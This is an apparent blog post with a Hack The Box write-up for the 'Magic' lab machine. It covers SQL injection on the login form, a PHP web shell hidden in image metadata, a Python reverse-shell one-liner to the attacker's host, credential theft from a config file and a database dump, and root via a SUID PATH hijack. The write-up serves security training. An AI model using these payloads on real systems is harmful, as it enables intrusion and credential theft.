<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script async src="https://www.googletagmanager.com/gtag/js?id=UA-175469707-1"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-175469707-1'); </script><title>Hackthebox - Magic | Rhovelionz</title><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox - Magic" /><meta name="author" content="Rhovelionz" /><meta property="og:locale" content="en_US" /><meta name="description" content="Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using,or in any other way utilizing these materials.These materials are for educational and research purposes only." /><meta property="og:description" content="Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using,or in any other way utilizing these materials.These materials are for educational and research purposes only." /><link rel="canonical" href="http://localhost:4000/posts/Magic/" /><meta property="og:url" content="http://localhost:4000/posts/Magic/" /><meta property="og:site_name" content="Rhovelionz" /><meta property="og:image" content="http://localhost:4000/assets/img/Post/Magic.jpeg" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-21T22:21:00+07:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="http://localhost:4000/assets/img/Post/Magic.jpeg" /><meta property="twitter:title" content="Hackthebox - Magic" /><meta name="twitter:site" content="@radivanh" /><meta name="twitter:creator" content="@Rhovelionz" /><meta name="google-site-verification" content="google-site-verification=eEOXNHtwQt24Bt3B-yrX7yp4uqtc0A-hWaVNSG5mL3E" /> <script type="application/ld+json"> {"url":"http://localhost:4000/posts/Magic/","headline":"Hackthebox - Magic","dateModified":"2020-08-21T22:21:00+07:00","datePublished":"2020-08-21T22:21:00+07:00","image":"http://localhost:4000/assets/img/Post/Magic.jpeg","author":{"@type":"Person","name":"Rhovelionz"},"description":"Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using,or in any other way utilizing these materials.These materials are for educational and research purposes only.","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/Magic/"},"@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="//assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="//assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="//assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="//assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="//assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="//assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="//assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="//assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="//assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="//assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="//assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="//assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="//assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="//assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="//assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="//assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="//assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="//assets/img/favicons/manifest.json"><meta name='msapplication-config' content='//assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="//assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="//" alt="avatar"> <img src="//assets/img/sample/rhovelionz.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">Rhovelionz</a></div><div class="site-subtitle font-italic">Publish Writeup and Pentesting Report</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="//" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="//tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>WHOAMI</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/rhovelionz" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/radivanh" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['radivanhradivanh','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="//"> Posts </a> </span> <span>Hackthebox - Magic</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox - Magic</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Aug 21, 2020, 10:21 PM +0700" > Aug 21, 2020 <i class="unloaded">2020-08-21T22:21:00+07:00</i> </span> by <span class="author"> Rhovelionz </span></div></div><div class="post-content"> <img src="/assets/img/Post/Magic.jpeg"><blockquote><p><strong>Any actions and or activities related to the material contained within this Website is solely your responsibility. This site contains materials that can be potentially damaging or dangerous. If you do not fully understand something on this site, then GO OUT OF HERE! Refer to the laws in your province/country before accessing, using,or in any other way utilizing these materials.These materials are for educational and research purposes only.</strong></p></blockquote><h2 id="summary"><strong><span style="color:#ff5555">Summary</span></strong></h2><hr /><ul><li>SQL injection on login page.</li><li>Use <strong>Exiftool</strong> to bypass the restricted format.</li><li>Upload and access the image.</li><li>Use <strong>mysqldumb</strong> to dump database to get password.</li><li>Enumeration with Linpeas</li><li>Exploit <code class="language-plaintext highlighter-rouge">SUID</code> <strong>sysinfo</strong> to get root.</li></ul><h2 id="port-scan"><strong><span style="color:#ff5555">Port Scan</span></strong></h2><hr /><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>➜  magic nmap -sC -sV -oA nmap/initial-scan magic.htb     
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-22 17:35 WIB
Nmap scan report for magic.htb (10.10.10.185)
Host is up (0.039s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Magic Portfolio
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds
</pre></table></code></div></div><p>It has two ports which <code class="language-plaintext highlighter-rouge">22</code> and <code class="language-plaintext highlighter-rouge">80</code> by default.</p><p>Open the webpage and I found bunch of images that being uploaded by other people and there is a login page, at this point I did not want to run <code class="language-plaintext highlighter-rouge">gobuster</code> yet because this machine kinda straightforward and plus, it has login page that I can play with <strong>SQLi</strong></p><h2 id="website"><strong><span style="color:#ff5555">Website</span></strong></h2><hr /><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/port80X.png" alt="" /></p><hr /><p>I use default credentials to log in with no luck.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/tryadminpassX.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/wrongcredsX.png" alt="" /></p><hr /><p>And found it has <strong>SQL</strong> injection on login form.</p><h2 id="sqli"><strong><span style="color:#ff5555">SQLi</span></strong></h2><hr /><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/firsttryX.png" alt="" /></p><hr /><p>By executing the <code class="language-plaintext highlighter-rouge">'='</code> in both <strong>username</strong> and <strong>password</strong> field, I’m in.</p><h2 id="upload-image"><strong><span style="color:#ff5555">Upload Image</span></strong></h2><hr /><p>It redirects to image uploader with only <code class="language-plaintext highlighter-rouge">jpg</code>,X.png<code class="language-plaintext highlighter-rouge"> and </code>jpeg` extensions that are available.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/canuploadimageX.png" alt="" /></p><hr /><p>So I tried to upload <strong>php reverse shell</strong> in order to check it, and unfortunately I could not upload any extension rather than images extensions.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/notallow1X.png" alt="" /></p><hr /><p>I even changed the format to <code class="language-plaintext highlighter-rouge">image.php.jpg</code>, and tried to upload it again, also it fails even worst.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/notallow2X.png" alt="" /></p><h2 id="remote-code-execution"><strong><span style="color:#ff5555">Remote Code Execution</span></strong></h2><hr /><p>I found a medium article that was posting about <strong>image file upload</strong> and it uses exiftool to manipulate the <code class="language-plaintext highlighter-rouge">metadata</code> with php code of the default image.</p><blockquote><p><a href="https://medium.com/@sebnemK/find-flag-in-image-file-upload-c9bc4975f595">Check in here</a></p></blockquote><p>So I figured out how to manipulate the metadata and try to execute it with random image</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/exiftoolX.png" alt="" /></p><hr /><p>The file got uploaded successfully and by visiting the web directories &amp; access the file, I got <strong>RCE</strong> (Remote Code Execution)</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/viewsourceX.png" alt="" /></p><hr /><h2 id="reverse-shell"><strong><span style="color:#ff5555">Reverse Shell</span></strong></h2><hr /><p>So instead of execute command <code class="language-plaintext highlighter-rouge">ls -lah,</code> I put python script one-liner to get reverse shell back to my machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://magic.htb/images/uploads/rhovelionz.php.jpg?cmd=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.20",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</pre></table></code></div></div><p>With this simple payload, I was able to get <strong>www-data</strong>’s shell.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/gotshell1X.png" alt="" /></p><hr /><p>Found <code class="language-plaintext highlighter-rouge">db.php5</code> in <code class="language-plaintext highlighter-rouge">/var/www/Magic</code> that shows database’s <code class="language-plaintext highlighter-rouge">credential</code> that being used by username <strong>theseus</strong>.</p><h2 id="escalating-to-user"><strong><span style="color:#ff5555">Escalating to user</span></strong></h2><hr /><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
</pre><td class="rouge-code"><pre>www-data@ubuntu:/var/www/Magic$ cat db.php5
cat db.php5
&lt;?php
class Database
{
    private static $dbName = 'Magic' ;
    private static $dbHost = 'localhost' ;
    private static $dbUsername = 'theseus';
    private static $dbUserPassword = 'iamkingtheseus';

    private static $cont  = null;

    public function __construct() {
        die('Init function is not allowed');
    }

    public static function connect()
    {
        // One connection through whole application
        if ( null == self::$cont )
        {
            try
            {
                self::$cont =  new PDO( "mysql:host=".self::$dbHost.";"."dbname=".self::$dbName, self::$dbUsername, self::$dbUserPassword);
            }
            catch(PDOException $e)
            {
                die($e-&gt;getMessage());
            }
        }
        return self::$cont;
    }

    public static function disconnect()
    {
        self::$cont = null;
    }
}
www-data@ubuntu:/var/www/Magic$ 
</pre></table></code></div></div><p>I found the credential <strong>theseus:iamkingtheseus</strong> from the <code class="language-plaintext highlighter-rouge">db.php5</code> and now I can access <code class="language-plaintext highlighter-rouge">Magic's</code> database</p><h2 id="mysql-dump"><strong><span style="color:#ff5555">MySQL Dump</span></strong></h2><hr /><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
</pre><td class="rouge-code"><pre>www-data@ubuntu:/var/www/Magic$ cd /dev/shm                                                                                                                                                        
cd /dev/shm                                                                                                                                                                                        
www-data@ubuntu:/dev/shm$ mysqldump Magic -u theseus -p                                                                                                                                            
mysqldump Magic -u theseus -p                                                                                                                                                                      
Enter password: iamkingtheseus                                                                                                                                                                     
                                                                                                                                                                                                   
-- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)                                                                                                                                            
--                                                                                                                                                                                                 
-- Host: localhost    Database: Magic                                                                                                                                                              
-- ------------------------------------------------------                                                                                                                                          
-- Server version       5.7.29-0ubuntu0.18.04.1                                                                                                                                                    
                                                                                                                                                                                                   
/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;                                                                                                                                  
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;                                                                                                                                
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;                                                                                                                                  
/*!40101 SET NAMES utf8 */;                                                                                                                                                                        
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;                                                                                                                                                        
/*!40103 SET TIME_ZONE='+00:00' */;                                                                                                                                                                
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `login`
--

DROP TABLE IF EXISTS `login`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `login` (
  `id` int(6) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `password` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `login`
--

LOCK TABLES `login` WRITE;
/*!40000 ALTER TABLE `login` DISABLE KEYS */;
INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
/*!40000 ALTER TABLE `login` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2020-08-22  4:15:03
www-data@ubuntu:/dev/shm$ 
</pre></table></code></div></div><p>And I found a password from the database which is <strong>Th3s3usW4sK1ng</strong>, so I tried to get to high privilege user in order to get more authorities from the box which is <strong>theseus</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/user1X.png" alt="" /></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/usertxtX.png" alt="" /></p><hr /><p>By seeing <code class="language-plaintext highlighter-rouge">user.txt</code>, I can confirm it’s time to escalate to root.</p><h2 id="escalating-to-root"><strong><span style="color:#ff5555">Escalating to Root</span></strong></h2><hr /><p>From the <code class="language-plaintext highlighter-rouge">nmap</code> results, it has port <code class="language-plaintext highlighter-rouge">22</code> opened and <strong>theseus</strong> has authorized_keys, so that I can add my <strong>ssh</strong> key to user <strong>theseus</strong>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/addedsshkeyX.png" alt="" /></p><hr /><p>Get in as <strong>SSH</strong> to get a proper shell as <strong>theseus</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/getinsshX.png" alt="" /></p><hr /><p>I decided to run <strong>linpeas</strong> in this machine, normally both with <code class="language-plaintext highlighter-rouge">pspy</code>, but since this machine is not a <code class="language-plaintext highlighter-rouge">hard</code> level machine, it’s not really needed.</p><p>I use <code class="language-plaintext highlighter-rouge">scp</code> to send <strong>linpeas</strong> from my machine.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/scp1X.png" alt="" /></p><hr /><p>And linpeas was able to detect that <code class="language-plaintext highlighter-rouge">/bin/sysinfo</code> is label as <strong>RED</strong></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/sysinfoexploitX.png" alt="" /></p><h2 id="suid-binary"><strong><span style="color:#ff5555">SUID Binary</span></strong></h2><hr /><p><code class="language-plaintext highlighter-rouge">/bin/sysinfo</code> kind of interesting to explore more, also it’s not a default <strong>SUID</strong> binary, and I believe it’s the right way to get me root.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>theseus@ubuntu:/dev/shm$ file /bin/sysinfo
/bin/sysinfo: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=9e9d26d004da0634c0747d16d377cd2a934e565a, not stripped
theseus@ubuntu:/dev/shm$
</pre></table></code></div></div><p>By checking the binary, it has:</p><ul><li><code class="language-plaintext highlighter-rouge">lshw hardware info</code></li><li><code class="language-plaintext highlighter-rouge">fdisk disk info</code></li><li><code class="language-plaintext highlighter-rouge">cat cpu info</code></li><li><code class="language-plaintext highlighter-rouge">free memory usage</code></li></ul><p>I decided to create my own <code class="language-plaintext highlighter-rouge">lshw</code> and execute the <code class="language-plaintext highlighter-rouge">/bin/sysinfo</code>.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/htb/magic/perfectrootX.png" alt="" /></p><hr /><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/images/mandatory/pwned.png" alt="" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='//categories/hackthebox/'>Hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="//tags/mysql/" class="post-tag no-text-decoration" >Mysql</a> <a href="//tags/sql-injection/" class="post-tag no-text-decoration" >Sql Injection</a> <a href="//tags/sqldump/" class="post-tag no-text-decoration" >Sqldump</a> <a href="//tags/php/" class="post-tag no-text-decoration" >Php</a> <a href="//tags/metadata/" class="post-tag no-text-decoration" >Metadata</a> <a href="//tags/reverse-shell/" class="post-tag no-text-decoration" >Reverse Shell</a> <a href="//tags/path-hijack/" class="post-tag no-text-decoration" >Path Hijack</a> <a href="//tags/suid-exploit/" class="post-tag no-text-decoration" >Suid Exploit</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="/knowledge-should-be-free">do wtf you want with it.</a></div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox - Magic - Rhovelionz&url=http://localhost:4000/posts/Magic/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox - Magic - Rhovelionz&u=http://localhost:4000/posts/Magic/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox - Magic - Rhovelionz&url=http://localhost:4000/posts/Magic/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/posts/Magic/" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ssh/">Ssh</a> <a class="post-tag" href="/tags/cracking/">Cracking</a> <a class="post-tag" href="/tags/php/">Php</a> <a class="post-tag" href="/tags/john/">John</a> <a class="post-tag" href="/tags/secretsdump/">Secretsdump</a> <a class="post-tag" href="/tags/reverse-shell/">Reverse Shell</a> <a class="post-tag" href="/tags/python/">Python</a> <a class="post-tag" href="/tags/mysql/">Mysql</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/kerbrute/">Kerbrute</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>More stuffs below ↓</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Quick/"><div class="card-body"> 